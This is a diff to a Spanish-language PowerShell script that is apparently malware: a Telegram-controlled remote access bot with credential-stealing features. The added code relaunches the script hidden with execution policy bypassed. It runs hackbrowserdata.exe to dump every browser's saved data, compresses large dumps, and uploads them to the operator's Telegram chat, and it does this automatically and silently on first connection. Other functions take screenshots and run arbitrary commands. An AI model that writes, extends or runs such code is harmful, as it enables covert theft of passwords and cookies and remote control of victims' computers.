@@ -3,7 +3,10 @@ param(
     [string]$Token,
 
     [Parameter(Mandatory = $true)]
-    [string]$ChatId
+    [string]$ChatId,
+
+    [switch]$ModoSteal,
+    [switch]$Silencioso
 )
 
 Set-StrictMode -Version Latest
@@ -16,6 +19,7 @@ $Script:BotConfig = [ordered]@{
     EstadoInternet = $false
     PrimeraEjecucion = $true
 }
+$Script:ChatId = [string]$ChatId
 
 $null = New-Item -ItemType Directory -Path (Split-Path $Script:LogPath) -Force -ErrorAction SilentlyContinue
 try {
@@ -114,59 +118,6 @@ function Debe-Ejecutar-Steal {
     }
 }
 
-function Iniciar-ExtraccionEnSegundoPlano {
-    param(
-        [Parameter(Mandatory = $true)] [string]$chatId,
-        [bool]$silencioso = $false
-    )
-
-    $estado = Cargar-EstadoSteal
-    $ahora = (Get-Date).ToString('o')
-    $estado.ultimaEjecucion = $ahora
-    $estado.ultimaMarca = $ahora
-    $estado.ultimoResultado = $false
-    $null = Guardar-EstadoSteal -Estado $estado
-
-    $worker = Join-Path $env:APPDATA 'CarpetaDos\steal_worker.ps1'
-    $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
-    if ([string]::IsNullOrWhiteSpace($scriptDir)) {
-        $scriptDir = (Get-Location).Path
-    }
-
-    $worker = Join-Path $scriptDir 'steal_worker.ps1'
-    if (-not (Test-Path -LiteralPath $worker)) {
-        $worker = Join-Path $env:APPDATA 'CarpetaDos\steal_worker.ps1'
-    }
-
-    if (-not (Test-Path -LiteralPath $worker)) {
-        if (-not $silencioso) {
-            Enviar-Mensaje -chatId $chatId -texto 'No se encontró el worker de extracción de navegadores.'
-        }
-        Write-Log 'No existe steal_worker.ps1'
-        return $false
-    }
-
-    try {
-        $p = Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $worker, '-Token', $Token, '-ChatId', $chatId, '-StatePath', (Obtener-RutaEstadoSteal)) -WindowStyle Hidden -PassThru
-        if ($null -ne $p) {
-            if (-not $silencioso) {
-                Enviar-Mensaje -chatId $chatId -texto 'Extracción en segundo plano iniciada. Te aviso cuando termine.'
-            }
-            return $true
-        }
-
-        Write-Log 'No se pudo iniciar el proceso de extracción en segundo plano.'
-        return $false
-    }
-    catch {
-        Write-Log ('Error arrancando steal worker: ' + (Get-ErrorText $_.Exception))
-        if (-not $silencioso) {
-            Enviar-Mensaje -chatId $chatId -texto 'No se pudo iniciar la extracción en segundo plano.'
-        }
-        return $false
-    }
-}
-
 function Enviar-Mensaje {
     param(
         [Parameter(Mandatory = $true)] [string]$chatId,
@@ -176,8 +127,9 @@ function Enviar-Mensaje {
     try {
         if ([string]::IsNullOrWhiteSpace($texto)) { return $false }
 
-        $body = @{ chat_id = $chatId; text = $texto; parse_mode = 'Markdown' } | ConvertTo-Json -Compress
-        Invoke-RestMethod -Uri ($Script:ApiUrl + '/sendMessage') -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null
+        $payload = @{ chat_id = [string]$chatId; text = $texto } | ConvertTo-Json -Compress
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+        Invoke-RestMethod -Uri ($Script:ApiUrl + '/sendMessage') -Method Post -ContentType 'application/json; charset=utf-8' -Body $bytes -ErrorAction Stop | Out-Null
         return $true
     }
     catch {
@@ -186,44 +138,11 @@ function Enviar-Mensaje {
     }
 }
 
-function Enviar-MensajeLargo {
-    param(
-        [Parameter(Mandatory = $true)] [string]$chatId,
-        [Parameter(Mandatory = $true)] [string]$texto
-    )
-
-    $max = 4000
-    if ($texto.Length -le $max) {
-        return (Enviar-Mensaje -chatId $chatId -texto $texto)
-    }
-
-    $partes = [Math]::Ceiling($texto.Length / $max)
-    $ok = $true
-    for ($i = 0; $i -lt $partes; $i++) {
-        $inicio = $i * $max
-        $longitud = [Math]::Min($max, $texto.Length - $inicio)
-        $parte = $texto.Substring($inicio, $longitud)
-        $body = @{ chat_id = $chatId; text = '```' + $parte + '```'; parse_mode = 'Markdown' } | ConvertTo-Json -Compress
-
-        try {
-            Invoke-RestMethod -Uri ($Script:ApiUrl + '/sendMessage') -Method Post -ContentType 'application/json' -Body $body -ErrorAction Stop | Out-Null
-        }
-        catch {
-            Write-Log ('Error enviando mensaje largo: ' + (Get-ErrorText $_.Exception))
-            $ok = $false
-        }
-
-        Start-Sleep -Milliseconds 300
-    }
-
-    return $ok
-}
-
 function Enviar-DocumentoRaw {
     param(
         [Parameter(Mandatory = $true)] [string]$chatId,
         [Parameter(Mandatory = $true)] [string]$rutaArchivo,
-        [string]$caption = $null
+        [string]$caption = ''
     )
 
     try {
@@ -236,7 +155,7 @@ function Enviar-DocumentoRaw {
         $uri = $Script:ApiUrl + '/sendDocument'
 
         $form = @{
-            chat_id = $chatId
+            chat_id = [string]$chatId
             document = $file
         }
 
@@ -244,12 +163,11 @@ function Enviar-DocumentoRaw {
             $form.caption = $caption
         }
 
-        $response = Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
-        Write-Log ('Enviado: ' + $file.Name + ' - OK: ' + $response.ok)
+        Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop | Out-Null
         return $true
     }
     catch {
-        Write-Log ('Error enviando doc raw: ' + (Get-ErrorText $_.Exception))
+        Write-Log ('Error enviando documento: ' + (Get-ErrorText $_.Exception))
         return $false
     }
 }
@@ -268,10 +186,7 @@ function Enviar-Foto {
 
         $uri = $Script:ApiUrl + '/sendPhoto'
         $file = Get-Item -LiteralPath $rutaFoto
-        $form = @{
-            chat_id = $chatId
-            photo = $file
-        }
+        $form = @{ chat_id = [string]$chatId; photo = $file }
 
         if (-not [string]::IsNullOrWhiteSpace($titulo)) {
             $form.caption = $titulo
@@ -301,10 +216,10 @@ function Tomar-Captura {
         $graphics.Dispose()
         $bitmap.Dispose()
 
-        $enviado = Enviar-Foto -chatId $chatId -rutaFoto $ruta -titulo ('Screenshot - ' + $timestamp)
+        $ok = Enviar-Foto -chatId $chatId -rutaFoto $ruta -titulo ('Screenshot - ' + $timestamp)
         Start-Sleep -Seconds 1
         Remove-Item -LiteralPath $ruta -Force -ErrorAction SilentlyContinue
-        return $enviado
+        return $ok
     }
     catch {
         Write-Log ('Error captura: ' + (Get-ErrorText $_.Exception))
@@ -313,18 +228,19 @@ function Tomar-Captura {
 }
 
 function Obtener-HackBrowserDataPath {
-    $candidatos = @()
-
+    $destDir = Join-Path $env:APPDATA 'CarpetaDos'
     $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
     if ([string]::IsNullOrWhiteSpace($scriptDir)) {
         $scriptDir = (Get-Location).Path
     }
 
-    $destDir = Join-Path $env:APPDATA 'CarpetaDos'
-    $candidatos += (Join-Path $scriptDir 'hackbrowserdata.exe')
-    $candidatos += (Join-Path $scriptDir 'hack-browser-data.exe')
-    $candidatos += (Join-Path $destDir 'hackbrowserdata.exe')
-    $candidatos += (Join-Path $destDir 'hack-browser-data.exe')
+    $candidatos = @(
+        (Join-Path $scriptDir 'hackbrowserdata.exe'),
+        (Join-Path $scriptDir 'hack-browser-data.exe'),
+        (Join-Path $destDir 'hackbrowserdata.exe'),
+        (Join-Path $destDir 'hack-browser-data.exe'),
+        (Join-Path $env:TEMP 'hackbrowserdata.exe')
+    )
 
     foreach ($ruta in $candidatos) {
         if (-not [string]::IsNullOrWhiteSpace($ruta) -and (Test-Path -LiteralPath $ruta)) {
@@ -364,11 +280,6 @@ function Ejecutar-HackBrowserData {
         $tempDir = Join-Path $env:TEMP ('BrowserData_' + $timestamp)
         $null = New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction SilentlyContinue
 
-        $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
-        if ([string]::IsNullOrWhiteSpace($scriptDir)) {
-            $scriptDir = (Get-Location).Path
-        }
-
         $hackBrowserPath = Obtener-HackBrowserDataPath
         if ([string]::IsNullOrWhiteSpace($hackBrowserPath)) {
             if (-not $silencioso) {
@@ -381,7 +292,7 @@ function Ejecutar-HackBrowserData {
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = $hackBrowserPath
         $psi.Arguments = 'dump -b all -c all -f json -d "' + $tempDir + '"'
-        $psi.WorkingDirectory = $scriptDir
+        $psi.WorkingDirectory = (Get-Location).Path
         $psi.CreateNoWindow = $true
         $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
         $psi.UseShellExecute = $false
@@ -407,32 +318,51 @@ function Ejecutar-HackBrowserData {
             return $false
         }
 
-        $arquivosJSON = Get-ChildItem -Path $tempDir -Filter '*.json' -Recurse -ErrorAction SilentlyContinue
-        if ($null -eq $arquivosJSON -or $arquivosJSON.Count -eq 0) {
+        $archivos = Get-ChildItem -Path $tempDir -Filter '*.json' -Recurse -ErrorAction SilentlyContinue
+        if ($null -eq $archivos -or $archivos.Count -eq 0) {
             if (-not $silencioso) {
                 Enviar-Mensaje -chatId $chatId -texto 'No se generaron archivos JSON. Verifica que los navegadores esten instalados.'
             }
-            Write-Log 'No se encontraron archivos JSON'
             Remove-Item -LiteralPath $tempDir -Recurse -Force -ErrorAction SilentlyContinue
             return $false
         }
 
         $enviados = 0
         $errores = @()
-        foreach ($archivo in $arquivosJSON) {
-            $nombreOriginal = $archivo.Name
-            $nombreConTimestamp = $archivo.BaseName + '_' + $timestamp + '.json'
-            $rutaRenombrado = Join-Path $archivo.DirectoryName $nombreConTimestamp
-            Rename-Item -LiteralPath $archivo.FullName -NewName $nombreConTimestamp -Force
 
-            $caption = '[' + $nombreOriginal + '] - ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-            Write-Log ('Enviando: ' + $nombreConTimestamp)
+        foreach ($archivo in $archivos) {
+            try {
+                $rutaBase = $archivo.FullName
+                $nombreBase = $archivo.Name
+                $rutaRenombrado = Join-Path $archivo.DirectoryName (($archivo.BaseName) + '_' + $timestamp + '.json')
+                if ($rutaBase -ne $rutaRenombrado) {
+                    Rename-Item -LiteralPath $rutaBase -NewName ([System.IO.Path]::GetFileName($rutaRenombrado)) -Force
+                    $rutaBase = $rutaRenombrado
+                }
 
-            if (Enviar-DocumentoRaw -chatId $chatId -rutaArchivo $rutaRenombrado -caption $caption) {
-                $enviados++
+                $archivoFinal = Get-Item -LiteralPath $rutaBase
+                $caption = '[' + $nombreBase + '] - ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+
+                if ($archivoFinal.Length -gt 8MB) {
+                    $zipPath = [System.IO.Path]::ChangeExtension($rutaBase, '.zip')
+                    if (Test-Path -LiteralPath $zipPath) { Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue }
+                    Compress-Archive -Path $rutaBase -DestinationPath $zipPath -Force -CompressionLevel Optimal | Out-Null
+                    if (Test-Path -LiteralPath $zipPath) {
+                        $archivoFinal = Get-Item -LiteralPath $zipPath
+                        $caption = '[ZIP] ' + $caption
+                    }
+                }
+
+                if (Enviar-DocumentoRaw -chatId $chatId -rutaArchivo $archivoFinal.FullName -caption $caption) {
+                    $enviados++
+                }
+                else {
+                    $errores += $nombreBase
+                }
             }
-            else {
-                $errores += $nombreOriginal
+            catch {
+                $errores += $archivo.Name
+                Write-Log ('Error preparando archivo para enviar: ' + (Get-ErrorText $_.Exception))
             }
 
             Start-Sleep -Milliseconds 300
@@ -506,11 +436,11 @@ function Ejecutar-Comando {
             $resultado += '(Sin salida)'
         }
 
-        if ($resultado.Length -gt 4000) {
-            Enviar-MensajeLargo -chatId $chatId -texto $resultado
+        if ($resultado.Length -gt 3500) {
+            Enviar-Mensaje -chatId $chatId -texto ($resultado.Substring(0, 3500) + '...')
         }
         else {
-            Enviar-Mensaje -chatId $chatId -texto ('```' + $resultado + '```')
+            Enviar-Mensaje -chatId $chatId -texto $resultado
         }
 
         return $true
@@ -530,7 +460,7 @@ function Listar-Directorio {
         $dirActual = Obtener-DirectorioActual
         $items = Get-ChildItem -ErrorAction SilentlyContinue | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
         $resultado = 'Directorio: ' + $dirActual + "`n" + ('=' * 50) + "`n" + $items
-        Enviar-Mensaje -chatId $chatId -texto ('```' + $resultado + '```')
+        Enviar-Mensaje -chatId $chatId -texto $resultado
         return $true
     }
     catch {
@@ -641,10 +571,10 @@ function Bot-BuclePrincipal {
                 $Script:BotConfig.EstadoInternet = $true
                 if ($Script:BotConfig.PrimeraEjecucion) {
                     $Script:BotConfig.PrimeraEjecucion = $false
-                    Enviar-Mensaje -chatId $ChatId -texto ('Conectado - ' + (Obtener-Info) + "`nChequeando extracción de navegadores...")
+                    Enviar-Mensaje -chatId $Script:ChatId -texto ('Conectado - ' + (Obtener-Info) + "`nChequeando extracción de navegadores...")
                     Start-Sleep -Seconds 2
                     if (Debe-Ejecutar-Steal) {
-                        Iniciar-ExtraccionEnSegundoPlano -chatId $ChatId -silencioso $true | Out-Null
+                        Iniciar-ExtraccionEnSegundoPlano -chatId $Script:ChatId -silencioso $true | Out-Null
                     }
                 }
             }
@@ -654,17 +584,20 @@ function Bot-BuclePrincipal {
                 continue
             }
 
-            $offset = $Script:BotConfig.LastUpdateId + 1
-            $url = $Script:ApiUrl + '/getUpdates?offset=' + [string]$offset + '&limit=5'
-            $res = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 20 -ErrorAction Stop
+            $offset = [long]$Script:BotConfig.LastUpdateId + 1
+            $payload = @{ offset = $offset; limit = 5; timeout = 30 } | ConvertTo-Json -Compress
+            $url = $Script:ApiUrl + '/getUpdates'
+            $res = Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json; charset=utf-8' -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -TimeoutSec 60 -ErrorAction Stop
 
-            if ($res.ok -and $res.result.Count -gt 0) {
+            if ($res.ok -and $null -ne $res.result -and $res.result.Count -gt 0) {
                 foreach ($up in $res.result) {
                     try {
-                        $Script:BotConfig.LastUpdateId = [long]$up.update_id
-                        $msg = $up.message
+                        if ($null -ne $up.update_id) {
+                            $Script:BotConfig.LastUpdateId = [long]$up.update_id
+                        }
 
-                        if ($null -ne $msg -and [string]$msg.from.id -eq [string]$ChatId) {
+                        $msg = $up.message
+                        if ($null -ne $msg -and [string]$msg.from.id -eq [string]$Script:ChatId) {
                             Procesar-Mensaje -mensaje $msg -chatId ([string]$msg.chat.id)
                         }
                     }
@@ -682,15 +615,73 @@ function Bot-BuclePrincipal {
     }
 }
 
+function Ejecutar-Steal-Directo {
+    param(
+        [Parameter(Mandatory = $true)] [string]$chatId,
+        [switch]$silencioso
+    )
+
+    $estado = Cargar-EstadoSteal
+    $estado.ultimaEjecucion = (Get-Date).ToString('o')
+    $estado.ultimaMarca = $estado.ultimaEjecucion
+    $estado.ultimoResultado = $false
+    $null = Guardar-EstadoSteal -Estado $estado
+
+    if (-not $silencioso) {
+        Enviar-Mensaje -chatId $chatId -texto 'Iniciando extracción de navegadores. Los archivos grandes se comprimirán antes de enviarse.'
+    }
+
+    $resultado = Ejecutar-HackBrowserData -chatId $chatId -silencioso:$silencioso
+    $estado = Cargar-EstadoSteal
+    $estado.ultimaEjecucionExito = (Get-Date).ToString('o')
+    $estado.ultimoResultado = [bool]$resultado
+    $null = Guardar-EstadoSteal -Estado $estado
+
+    return $resultado
+}
+
+function Iniciar-ExtraccionEnSegundoPlano {
+    param(
+        [Parameter(Mandatory = $true)] [string]$chatId,
+        [bool]$silencioso = $false
+    )
+
+    $args = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $PSCommandPath, '-Token', $Token, '-ChatId', $chatId, '-ModoSteal', '-Silencioso')
+
+    try {
+        $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $args -WindowStyle Hidden -PassThru
+        if ($null -ne $p) {
+            if (-not $silencioso) {
+                Enviar-Mensaje -chatId $chatId -texto 'Extracción en segundo plano iniciada. Te aviso cuando termine.'
+            }
+            return $true
+        }
+
+        return $false
+    }
+    catch {
+        Write-Log ('Error arrancando extracción en segundo plano: ' + (Get-ErrorText $_.Exception))
+        if (-not $silencioso) {
+            Enviar-Mensaje -chatId $chatId -texto 'No se pudo iniciar la extracción en segundo plano.'
+        }
+        return $false
+    }
+}
+
 try {
-    Enviar-Mensaje -chatId $ChatId -texto ('Bot iniciado en ' + (Obtener-Info))
+    if ($ModoSteal) {
+        Ejecutar-Steal-Directo -chatId $Script:ChatId -silencioso:$Silencioso
+        exit 0
+    }
+
+    Enviar-Mensaje -chatId $Script:ChatId -texto ('Bot iniciado en ' + (Obtener-Info))
     Bot-BuclePrincipal
 }
 catch {
     $msg = 'Fallo global: ' + (Get-ErrorText $_.Exception)
     Write-Log $msg
     try {
-        Enviar-Mensaje -chatId $ChatId -texto 'Bot reiniciando...'
+        Enviar-Mensaje -chatId $Script:ChatId -texto 'Bot reiniciando...'
     }
     catch {
     }
